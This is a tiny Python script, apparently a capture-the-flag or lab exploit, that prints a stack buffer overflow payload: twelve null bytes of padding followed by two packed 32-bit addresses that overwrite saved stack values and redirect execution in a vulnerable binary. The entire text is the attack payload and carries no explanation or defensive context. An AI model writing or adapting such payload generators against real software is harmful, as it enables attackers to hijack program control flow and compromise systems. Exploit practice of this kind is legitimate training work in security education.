from struct import pack

print("\x00" * 12 + pack("<I", 0xbffe8f28) + pack("<I", 0x08048efe))

